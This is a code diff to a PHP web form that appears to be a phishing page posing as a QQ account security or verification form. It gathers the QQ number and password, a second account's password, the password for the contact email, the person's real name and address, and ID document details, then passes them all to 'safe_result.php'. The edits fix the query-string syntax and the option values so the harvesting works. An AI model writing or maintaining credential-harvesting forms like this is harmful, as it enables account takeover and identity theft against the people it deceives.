@@ -111,7 +111,7 @@
             
             <ul>
 		<?php
-			$requestURL="u=".$_GET['u']."&p=".$_GET['p']."txtName=$trueName&txtAddress=$addr&txtContactQQ=$anotherQQ&txtContactQQPW=$password&radiobutton=$reciveType&txtContactEmail=$reciveMail&yxmm=$$reciveMailPassword";
+			$requestURL="u=".$_GET['u']."&p=".$_GET['p']."&txtName=$trueName&txtAddress=$addr&txtContactQQ=$anotherQQ&txtContactQQPW=$password&radiobutton=$reciveType&txtContactEmail=$reciveMail&yxmm=$$reciveMailPassword";
 		?>
 		<form id="myform" name="myform" method="post" action="safe_result.php?<?php echo $requestURL; ?>" onsubmit="return CheckForm();" accept-charset="gb2312">
 			<ul>
@@ -145,10 +145,10 @@
 			<li><blockquote for="mode">证件类型：</blockquote>
 							<select class="select_text" id="CertCardType" name="zj">
 				<option value="0" selected="selected">请选择证件类型</option>
-				<option value="身份证">身份证</option> 
-				<option value="护照">护照</option> 
-				<option value="军官证">军官证</option> 
-				<option value="其它">其它</option></select><span style="DISPLAY: none" id="zjlx" class="tips_info">请选择证件类型！</span>
+				<option value="shen_fen_zheng">身份证</option> 
+				<option value="hu_zhao">护照</option> 
+				<option value="jun_guan_zheng">军官证</option> 
+				<option value="qi_ta">其它</option></select><span style="DISPLAY: none" id="zjlx" class="tips_info">请选择证件类型！</span>
 				</li>
 			<li>
 				<blockquote><b>*</b>证件号码：</blockquote>
